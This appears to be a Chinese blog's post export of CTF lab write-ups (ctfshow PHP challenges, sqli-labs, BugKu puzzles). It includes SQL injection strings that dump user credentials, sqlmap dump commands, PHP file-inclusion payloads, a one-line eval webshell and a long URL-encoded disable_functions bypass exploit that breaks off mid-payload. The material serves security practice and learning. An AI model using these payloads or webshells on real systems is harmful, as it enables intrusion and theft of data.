web110\n![](/pic/110.png)\n考察FilesystemIterator。getcwd()函数 获取当前工作目录 返回当前工作目录。\npayload:\n~~~\n?v1=FilesystemIterator&v2=getcwd\n~~~\n缺陷是如果flag的文件不在第一位的话，就不能得到这个文件名。\n<!--more-->\n# web111\n![](/pic/111.png)\n考察 全局变量GLOBALS\n![](/pic/111.1.png)\n要执行这一段函数，v1要等于ctfshow\n~~~\nif(preg_match('/ctfshow/', $v1)){\n            getFlag($v1,$v2);\n    } \n~~~\n然后再将v2的值赋给v1，再接着getFlag函数，打印v1，v1为全局变量的时候，即可打印出flag。\npayload:\n~~~\n?v1=ctfshow&v2=GLOBALS\n~~~\n# web112\n![](/pic/112.png)\npayload:\n~~~\nphp://filter/resource=flag.php\nphp://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php\nphp://filter/read=convert.quoted-printable-encode/resource=flag.php\ncompress.zlib://flag.php\n~~~\n[php://filter的各种过滤器](https://blog.csdn.net/qq_44657899/article/details/109300335)\n# web113\n![](/pic/113.png)\npayload:\n可以用zlib伪协议\n~~~\n?file=compress.zlib://flag.php\n~~~\n也可以用/proc/self/root\n~~~\n?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p\nroc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro\nc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/\nself/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se\nlf/root/proc/self/root/var/www/html/flag.php\n~~~\n[proc目录的应用](https://blog.csdn.net/cosmoslin/article/details/122660083)\n![](/pic/114.png)\ncompress，和非预期都被禁了，但是伪协议放出来了，可以直接使用伪协议读\npayload:\n~~~\n?file=php://filter/resource=flag.php\n~~~\n# web115\n![](/pic/115.png)\n考察点：trim函数的绕过+is_numeric绕过\n~~~\n语法\ntrim(string,charlist)\n\n参数\t描述\nstring\t        必需。规定要检查的字符串。\ncharlist\t    可选。规定从字符串中删除哪些字符。如果省略该参数，则移除下列所有字符：\n\n\"\\0\"       - NULL\n\"\\t\"       - 制表符\n\"\\n\"       - 换行\n\"\\x0B\"     - 垂直制表符\n\"\\r\"       - 回车\n\" \"        - 空格\n~~~\n看师傅的wp才能做出来，在本地测试一下\n~~~\n<?php\n\nfor($i=0;$i<=128;$i++){\n    $str=chr($i).\"1\";\n    if(is_numeric($str)&& trim($str)!=='1'){\n        echo urlencode(chr($i)).\"<br>\";\n    }\n}\n~~~\n可以用%0c换页，\npayload:\n~~~\n?num=%0c36\n~~~\n# web123\n![](/pic/123.png)\n~~~\nGET或POST的方式传进去的变量名，会自动将空格 + . [ 转换为_,想构造出.，需要前面带上[，后面用.就可以不变成_。\n~~~\n\npayload:\n~~~\nPOST:CTF_SHOW=&CTF[SHOW.COM=&fun=echo $flag\n~~~\n# web125\n![](/pic/125.png)\n~~~\n1、cli模式（命令行）下\n\n\t第一个参数$_SERVER['argv'][0]是脚本名，其余的是传递给脚本的参数\n\n2、web网页模式下\n\n\t在web页模式下必须在php.ini开启register_argc_argv配置项\n\t\n    设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果\n\n    这时候的$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]\n\n    $argv,$argc在web模式下不适用\n~~~\npayload:\n~~~\npayload:\nget:  $fl0g=flag_give_me;\npost:  CTF_SHOW=1&CTF%5bSHOW.COM=1&fun=eval($a[0])\n~~~","tags":["ctfshow","刷题","php特性"],"categories":["ctfshow","刷题","php特性"]},{"title":"ctfshow web入门105~109","url":"/2023/02/26/ctfshow-web入门105/","content":"![](/pic/105.png)\n~~~\nforeach($_GET as $key => $value){\n    if($key==='error'){\n        die(\"what are you doing?!\");\n    } \n~~~\n这一段说get传的值不能等于error。\n~~~\nforeach($_POST as $key => $value){\n    if($value==='flag'){\n        die(\"what are you doing?!\");\n    } \n~~~\n这一段说POST传的值不能等于flag。\n~~~\nif(!($_POST['flag']==$flag)){\n    die($error);\n} \n~~~\n这一段说POST传的值不等于flag的话输出变量error。\npayload:\n~~~\nGET:?a=flag\nPOST:error=a\n~~~\n<!--more-->\n# web106\n![](/pic/106.png)\n这道题就比web105多一个比较。\npayload:\n~~~\nGET:v2[]=1\nPOST:v1[]=2\n~~~\n# web107\n![](/pic/107.png)\n~~~\nparse_str(string,array)\n把查询字符串解析到变量中。\nstring必选。规定要解析的字符串\narray可选。规定存储变量的数组的名称。\n~~~\n题目就是把v1的值赋给v2，然后让v2的值和v3的MD5值相同。\npayload:\n~~~\nGET:?v3=a\nPOST:v1=flag=0cc175b9c0f1b6a831c399e269772661\n~~~\nMD5没办法处理数组。\n~~~\nGET:?v3=a\nPOST:v1=   #空\n~~~\n# web108\n连接不到服务器.....\n# web109\n找不到服务器......","tags":["ctfshow","刷题","php特性"],"categories":["ctfshow","刷题","php特性"]},{"title":"Hello World","url":"/2023/02/26/hello-world/","content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n"},{"title":"sqli-labs","url":"/2023/02/20/sqli-labs/","content":"# less-1\n![](/pic/sqli/1.png)\n看报错可知，这是闭合单引号。\n~~~\n?id=1'order by 3 -- - #确定那个字段有回显\n?id=-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' -- - #查询表名\n?id=-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' -- -  #查询列名\n?id=-1'union select 1,2,group_concat(username,'~',password) from users -- - #查询当前数据库user表里面的username和password。\n~~~\n<!--more-->\n用sqlmap更简单\n~~~\nsqlmap -u \"ip?id=1\"\nsqlmap -u \"ip?id=1\" -dbs #列出所有数据库\nsqlmap -u \"ip?id=1\" -D security -tables #列出当前数据库里的表\nsqlmap -u \"ip?id=1\" -D security -T users -columns #列出表里的列\nsqlmap -u \"ip?id=1\" -D security -T users -C username,password --dump #获取表里的数据\n~~~\n# less-2\n![](/pic/sqli/2.png)\n这一题就不用闭合，剩下的和第一题一样。\n~~~\n?id=1 order by 3 -- - \n?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' -- -\n?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' -- - \n?id=-1 union select 1,2,group_concat(username,'~',password) from users -- - \n~~~\n# less-3\n![](/pic/sqli/3.png)\n看错误提示可知，需要用`')`来闭合，剩下的和第一题一样。\n~~~\n?id=1') order by 3 -- - \n?id=-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' -- -\n?id=-1') union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' -- - \n?id=-1') union select 1,2,group_concat(username,'~',password) from users -- - \n~~~\n# less-4\n![](/pic/sqli/4.png)\n看错误提示，可知闭合方式是`\")`，但是单引号不会报错,剩下的和第一题一样。\n~~~\n?id=1\") order by 3 -- - \n?id=-1\") union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' -- -\n?id=-1\") union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' -- - \n?id=-1\") union select 1,2,group_concat(username,'~',password) from users -- - \n~~~\n# less-5\n![](/pic/sqli/5.png)\n根据错误可以判断是单引号报错。联合注入也没有办法用，可以使用报错注入。\nextractvalue函数\npayload:id='and(select extractvalue(\"anything\",concat('~',(select语句))))\n~~~\n函数原型：extractvalue(xml_document,Xpath_string)\n正常语法：extractvalue(xml_document,Xpath_string);\n第一个参数：xml_document是string格式，为xml文档对象的名称\n第二个参数：Xpath_string是xpath格式的字符串\n作用：从目标xml中返回包含所查询值的字符串\n~~~\npayload：\n~~~\n?id=-1'and (select extractvalue(1,concat(\"~\",(select database()))))-- - #获取当前数据库的名称\n?id=-1'and (select extractvalue(1,concat(\"~\",substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31))))-- -\n#查询当前数据库里所有的表\n?id=-1'and (select extractvalue(1,concat(\"~\",substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,31))))-- -\n#查询表里列的名称\n?id=-1'and (select extractvalue(1,concat(\"~\",substr((select group_concat(username,'~',password) from users),1,31))))-- -\n#查询表里面的内容\n\n\n\n# extractvalue()函数能显示的最大长度为32，所以用substr()函数来分页，或者使用limit分页也可以。concat()里面的~也可以是其他的。\n~~~\n\nupdatexml:\npayload:id='and(select updatexml(\"anything\",concat('~',(select语句())),\"anything\"))\n~~~\n?id=-1'and updatexml(1,concat('~',(select database())),1)-- -\n?id=-1'and updatexml(1,concat('~',(select group_concat(table_name)from information_schema.tables where table_schema=database() )),1)-- -\n?id=-1'and updatexml(1,concat('~',(select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='users' )),1)-- -\n?id=-1'and (select extractvalue(1,concat(\"~\",substr((select group_concat(username,'~',password) from users),1,31))))-- -\n~~~\n\nfloor:\npayload:'union select 1 from (select count(*),concat((slelect语句),floor(rand(0)*2))x from \"一个足大的表\" group by x)a\n# less-6\n闭合方式为`\"`，报错注入仍可行。\n# less-7\n文件读写注入，但是我怎么运行文件都不写入，放弃了。\n# less-8\n布尔盲注。\n~~~\n?id=-1'and (ascii(substr(select database()),1,1))==115--+ #判断第一个数据库名字第一个字符的ascii码是否等于115\n?id=1' and (ascii(substr((select database()) ,2,1))) = 101 --+ #判断第一个数据库名字第二个字符的ascii码是否等于101\n?id=1'and (length(database())) = 8 --+ #判断数据库名字的长度是否等于8\n?id=1'and (length(select table_name from information_schema.tables where table_schema='security' limit 3,1)) = 5 --+ #判断地三张表名字的长度是否为5\n?id=1' and (length((select column_name from information_schema.columns where table_name='users' limit 1,1))) = 8 --+ #判断users表里地二个列名的长度是否为8\n~~~\n如果判断正确的话，页面返回正常。\n好麻烦啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊。\n# less-9\n时间盲注\n~~~\nid=1' and if(length(database())>3 ,sleep(5),1) -- - #如果数据库长度长于3的话，延迟5秒返回页面。\n~~~\n[MySQL时间盲注五种延时方法 ](https://www.cnblogs.com/forforever/p/13019703.html)\n# less-10\n还是时间盲注，闭合方式为`\"`。\n# less-11\n![](/pic/sqli/11.png)\n这个就在username上直接输入sql语句就行。\n也可以用hackbar，Post传参。其他语句不变。.\n\n","tags":["sql注入"],"categories":["web"]},{"title":"ctfshow web入门101~104","url":"/2023/02/18/ctfshow-web入门101~104/","content":"# web101\n![](/pic/101.png)\n~~~\n当新建ReflectionClass类并传入PHP代码时，会返回代码的运行结果，可以通过echo显示\n即使传入了空的括号，代码依旧可以运行，且error_reporting(0)的存在阻止了报错\n~~~\nv1必须是数字，v2可以使用可以使用反射类new ReflectionClass(),v3没有过滤`;`。\npayload:\n~~~\nv1=1&v2=echo new Reflectionclass&v3=;\n~~~\n0x2d还是-，然后最后一位需要自己猜。\n# web102\n![](/pic/102.png)\n~~~\nis_numeric() 函数用于检测变量是否为数字或数字字符串，如果指定的变量是数字和数字字符串则返回true，否则返回false。如果字符串中含有一个e代表科学计数法，也可返回true\n\ncall_user_func() 函数用于调用方法或者变量，第一个参数是被调用的函数，第二个是调用的函数的参数\n\nfile_put_contents() 函数应该都熟悉了，写入内容到文件中，第一个参数是文件名，第二个参数是内容\n~~~\n要确保v4为真，就要确保v2是数字.将v2进行base64编码然后再转换成16进制。\npayload：\n~~~\nv2=115044383959474e6864434171594473&v3=php://filter/write=convert.base64-decode/resource=2.php\nPOST：v1=hex2bin\n~~~\n然后访问2.php查看源码就能找到flag。\n# web103\n找不到服务器，做不了题.\n# web104\n![](/pic/104.png)\n因为没有判断，可以直接让两个值相等，也可以用数组绕过，也可以用两个相等的sha1的值。\n~~~\naaK1STfY\n0e76658526655756207688271159624026011393\naaO8zKZF\n0e89257456677279068558073954252716165668\n~~~\n","tags":["ctfshow","刷题","php特性"],"categories":["ctfshow","刷题","php特性"]},{"title":"ctfshow web97~100","url":"/2023/02/07/ctfshow-web入门97~100/","content":"# web97\n![](/pic/97.png)\n要求POST传参，a不能等于b，但是a和b的md5值要相同，但是md5这个函数呢有个漏洞，传入的参数为数组的时候会发生错误，并返回NULL。\n~~~\na[]=123&b[]=1234\n~~~\n<!--more-->\n# web98\n![](/pic/98.png)\n~~~\n分析上面的代码可以看出来，只要有输入的get参数就将get方法改变为post方法(修改了get方法\n的地址），而第二三行代码没啥用，我们用不到，直接看第四行，如果get参数HTTP_FLAG的值为\nflag，就读取文件，也就是输出flag。所以思路就有了，我们通过get随便传一个参数并赋值，\n然后我们通过post请求传HTTP_FLAG参数并赋值为flag即可获得flag。\n~~~\n~~~\nGET:?1=1\nPOST:HTTP_FLAG=flag\n~~~\n# web99\n![](/pic/99.png)\n~~~\n array()，是空数组定义，题中定义了$allow为空数组\n0x36d，其十进制为877\nrand()，返回随机整数\narray_push()，是向数组尾部插入新的值\nfile_put_contents()，写文件\n~~~\n因为in_array第三个参数没设置为true，所以该函数是宽松比较（==），字符串型会先转化为整型再比较，只要值相同就可以了，所以我们可以传参写木马进去.\n~~~\n?n=1.php\ncontent=<?php @eval($_POST[1]);?>\n~~~\n然后用蚁剑连接\n# web100\n![](/pic/100.png)\nis_numeric() 函数用于检测变量是否为数字或数字字符串,如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE。\nv1一定要是个数字，v2不能有分号，v3必须有分号。\n~~~\nget:/?v1=1&v2=eval($_POST[1])?> %23&v3=;\npost:1=system(\"tac ctfshow.php\");\n~~~\n~~~\n$flag_is_3110c36f0x2df28a0x2d4b840x2dbe0f0x2d2c4f600a4b95;\n~~~\n0x2d是-，换上后加上ctfshow{}就可以了","tags":["ctfshow","刷题","php特性"],"categories":["ctfshow","刷题","php特性"]},{"title":"ctfshow web89~96","url":"/2023/02/02/89/","content":"# web89\n![](/pic/89.png)\n用数组绕过就行。\npayload:\n~~~\n?num[]=a;\n~~~\n<!--more-->\n# web90\n![](/pic/90.png)\n~~~\nintval( mixed $var[, int $base = 10] ) : int\n\nvar\n要转换成 integer 的数量值\nbase\n转化所使用的进制 \nNote: \n如果 base 是 0，通过检测 var 的格式来决定使用的进制： \n◦ 如果字符串包括了 \"0x\" (或 \"0X\") 的前缀，使用 16 进制 (hex)；否则，  \n◦ 如果字符串以 \"0\" 开始，使用 8 进制(octal)；否则，  \n◦ 将使用 10 进制 (decimal)。 \n~~~\n只需要提交0x117c就行，0x117c是16进制的4476，也可以提交4476+字符。\npayload:\n~~~\n?num=0x117c\n?num=4476a\n~~~\n# web91\n![](/pic/91.png)\n第一次是/im第二次是/i\n/im可以匹配多行，/i只能匹配一行。\n所以让他第一次匹配到php第二次匹配不到php。\npayload:\n~~~\n?cmd=1%0aphp\n~~~\n# web92\n![](/pic/92.png)\n可以换个进制绕过\n~~~\n?num=0x117c\n~~~\n或者还有e这个东西\n~~~\nintval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中不是科学计数法。所以为了绕过前面的==4476我们就可以构造 4476e123 其实不需要是e其他的字母也可以\n~~~\n\n~~~\n?num=4476e123\n~~~\n# web93\n![](/pic/93.png)\n可以用小数，也可以用8进制\npayload:\n~~~\n?num=4476.1\n?num=010574\n~~~\n~~~\n二进制0bxxx\n八进制0xxxxxx\n十六进制0xaaaa\n~~~\n# web94\n![](/pic/94.png)\nstrpos是匹配字符，必须要匹配到0而且还不能在第一位，可以用8进制也可以用小数。\n如果用8进制的话必须在开头加一个空格。\npayload:\n~~~\n?num=4476.0\n/?num= 010574\n~~~\n# web95\n![](/pic/95.png)\n这一道题多过滤了一个点，所以没法用小数了，其他的跟上一道题一样。\npayload:\n~~~\n?num= 010574\n~~~\n# web96\n![](/pic/96.png)\n想办法读取flag.php还不能直接传flag.php，利用路径或者php协议就行。\npayload:\n~~~\n?u=/var/www/html/flag.php\n?u=./flag.php\n?u=php://filter/resource=falg.php\n~~~","tags":["ctfshow","刷题","php特性"],"categories":["ctfshow","刷题","php特性"]},{"title":"ctfshow web入门87~88","url":"/2023/01/31/ctfshow-web入门87/","content":"# web87\n![](/pic/87.png)\n[谈一谈php://filter的妙用](https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list)\n<!--more-->\n~~~\n将 php://filter/write=convert.base64-decode/resource=123.php （这里因为我们需要的是写入的权限，所以是write）进行两次url编码，得到如下\n\nn~~~\n然后再content写入经过base64编码过后的一句话 （PD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==）\n这里content的值前面要加两个字符，因为base64算法解码时是4个byte一组，所以给他增加2个字符 一共8个字符\n![](/pic/87.1.png)\n![](/pic/87.2.png)\n然后再查看fl0g.php就行了\n# web88\n![](/pic/88.png)\n过滤的东西很多，但data协议还可以用。\n~~~\n?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgKi5waHAiKTs/Pg\n~~~\nbase64后面是base64编码但是不能带有加号和等号，有加号的payload不能用。\n# web116和web117\n不会做.....","tags":["ctfshow","刷题","文件包含"],"categories":["ctfshow","刷题","文件包含"]},{"title":"BugKu刷题","url":"/2023/01/28/BugKu刷题/","content":"# 聪明的小羊\n题目描述：一只小羊翻过了2个栅栏 fa{fe13f590lg6d46d0d0}\n栅栏密码，分两栏时就是flag。\n<!--more-->\nflag:`flag{6fde4163df05d900}`\n# /.-\n题目描述： ..-./.-../.-/--./----.--/-../...--/..-./-.-./-.../..-./.----/--.../..-./----./...--/----./----./...../-----/....-/-----.-\n很明显的摩斯密码，[在线摩斯密码翻译](https://www.lddgo.net/encrypt/morse)，可以解出flag：FLAG%u7bD3FCBF17F9399504%u7d\n%u7b是{，%u7d是}，然后字母全部改为小写就是flag。\nflag:`flag{d3fcbf17f9399504}`\n# ok\n题目是okk编码，用[](https://www.splitbrain.org/services/ook)可以直接获得flag。\nflag：`flag{0a394df55312c51a}`\n# linux\n下载文件解压，用记事本的形式打开文件，ctrl+搜索key就能找到flag。\nflag:`key{feb81d3834e2423c9903f4755464060b}`\n# 闪的好快\n下载是一个gif图，用stegsolve打开，一帧一帧扫二维码，然后拼接起来就是flag。\nflag：`SYC{F1aSh_so_f4sT}`\n#  隐写2\n图片的大小感觉和他本身有点不符，用binwalk一看，确实有隐藏的文件。\n分离之后是一个压缩包和一个提示，提示说明解压密码是三位数字。\n暴力破解一下，密码是871，解压之后又是一个图片，用记事本打开，末尾有`f1@g{eTB1IEFyZSBhIGhAY2tlciE=}`\nbase64解码得到falg。\nflag：`f1@g{y0u Are a h@cker!}`\n# 白哥的鸽子\n用stegsolve打开，fileformat最下面有类似于flag的文字。[栅栏密码在线加密解密](http://moersima.00cha.net/shanlan.asp)栅栏加密，\n当栅栏数为3时，就是flag。\nflag：`flag{w22_is_v3ry_cool}`\n# 再也没有纯白的灵魂\n文件开头是~呜嗷开头的，查过之后才发现是兽音密文[](https://roar.iiilab.com/)。由于不知道怎么加密的，就先将flag加密一下试试，然后一一对应，最坑人的是少了一个G，真的恶心人。。。。\n最后解出来就是flag。\nflag：`flag{ni-zhen-shi-shou-ren}`","tags":["刷题","BugKu"],"categories":["BugKu","刷题"]},{"title":"ctfshow web入门69~74","url":"/2023/01/25/ctfshow-web入门69~74/","content":"# web69\n和web68一样。\npayload:\n~~~\nc=include(\"/flag.txt\");\n~~~\n<!--more-->\n# web70\n同上。\n# web71\n![](/pic/71.png)\n~~~\n$s = ob_get_contents();//得到缓冲区的数据。\nob_end_clean();//会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容。可以用exit();停止后面的程序。\n~~~\npayload:\n~~~\nc=include(\"/flag.txt\");exit();\n~~~\n# web72\n![](/pic/72.png)\n这道题过滤了数字和字母，不会一点不会。\n参考一下大佬的wp\n[](https://rolemee.com/2021/07/16/ctfshow-web-ru-men-ming-ling-zhi-xing-72-rao-guo-disable-function-xian-zhi-he-open-basedir-xian-zhi/)\n将\n~~~\nc=?><?php\n$a=new DirectoryIterator(\"glob:///*\");\nforeach($a as $f)\n{echo($f->__toString().' ');\n}\nexit(0);\n?>\n~~~\n进行`url编码`。\n~~~\nc=?%3E%3C?php%0A$a=new%20DirectoryIterator(%22glob:///*%22);%0Aforeach($a%20as%20$f)%0A%7Becho($f-%3E__toString().'%20');%0A%7D%0Aexit(0);%0A?%3E\n~~~\n![](/pic/72.png)\n看到了`flag0.txt`,但是直接include的话没有权限。\n要用什么uaf绕过\npayload:\n~~~\nc=function%20ctfshow(%24cmd)%20%7B%0A%20%20%20%20global%20%24abc%2C%20%24helper%2C%20%24backtrace%3B%0A%0A%20%20%20%20class%20Vuln%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%3B%0A%20%20%20%20%20%20%20%20public%20function%20__destruct()%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20global%20%24backtrace%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20unset(%24this-%3Ea)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20(new%20Exception)-%3EgetTrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(!isset(%24backtrace%5B1%5D%5B'args'%5D))%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20debug_backtrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20class%20Helper%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%2C%20%24b%2C%20%24c%2C%20%24d%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20str2ptr(%26%24str%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24address%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24j%20%3D%20%24s-1%3B%20%24j%20%3E%3D%200%3B%20%24j--)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%3C%3C%3D%208%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%7C%3D%20ord(%24str%5B%24p%2B%24j%5D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24address%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20ptr2str(%24ptr%2C%20%24m%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24out%20%3D%20%22%22%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%3D0%3B%20%24i%20%3C%20%24m%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24out%20.%3D%20sprintf(%22%25c%22%2C(%24ptr%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24ptr%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24out%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20write(%26%24str%2C%20%24p%2C%20%24v%2C%20%24n%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24i%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24str%5B%24p%20%2B%20%24i%5D%20%3D%20sprintf(%22%25c%22%2C(%24v%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24v%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20leak(%24addr%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20global%20%24abc%2C%20%24helper%3B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%200x68%2C%20%24addr%20%2B%20%24p%20-%200x10)%3B%0A%20%20%20%20%20%20%20%20%24leak%20%3D%20strlen(%24helper-%3Ea)%3B%0A%20%20%20%20%20%20%20%20if(%24s%20!%3D%208)%20%7B%20%24leak%20%25%3D%202%20%3C%3C%20(%24s%20*%208)%20-%201%3B%20%7D%0A%20%20%20%20%20%20%20%20return%20%24leak%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20parse_elf(%24base)%20%7B%0A%20%20%20%20%20%20%20%20%24e_type%20%3D%20leak(%24base%2C%200x10%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20%24e_phoff%20%3D%20leak(%24base%2C%200x20)%3B%0A%20%20%20%20%20%20%20%20%24e_phentsize%20%3D%20leak(%24base%2C%200x36%2C%202)%3B%0A%20%20%20%20%20%20%20%20%24e_phnum%20%3D%20leak(%24base%2C%200x38%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24e_phnum%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24header%20%3D%20%24base%20%2B%20%24e_phoff%20%2B%20%24i%20*%20%24e_phentsize%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_type%20%20%3D%20leak(%24header%2C%200%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_flags%20%3D%20leak(%24header%2C%204%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_vaddr%20%3D%20leak(%24header%2C%200x10)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_memsz%20%3D%20leak(%24header%2C%200x28)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%206)%20%7B%20%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_addr%20%3D%20%24e_type%20%3D%3D%202%20%3F%20%24p_vaddr%20%3A%20%24base%20%2B%20%24p_vaddr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%205)%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24text_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20if(!%24data_addr%20%7C%7C%20!%24text_size%20%7C%7C%20!%24data_size)%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%0A%20%20%20%20%20%20%20%20return%20%5B%24data_addr%2C%20%24text_size%2C%20%24data_size%5D%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_basic_funcs(%24base%2C%20%24elf)%20%7B%0A%20%20%20%20%20%20%20%20list(%24data_addr%2C%20%24text_size%2C%20%24data_size)%20%3D%20%24elf%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24data_size%20%2F%208%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20%24i%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x746e6174736e6f63)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20(%24i%20%2B%204)%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x786568326e6962)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20%24data_addr%20%2B%20%24i%20*%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_binary_base(%24binary_leak)%20%7B%0A%20%20%20%20%20%20%20%20%24base%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%24start%20%3D%20%24binary_leak%20%26%200xfffffffffffff000%3B%0A%20%20%20%20%20%20%20%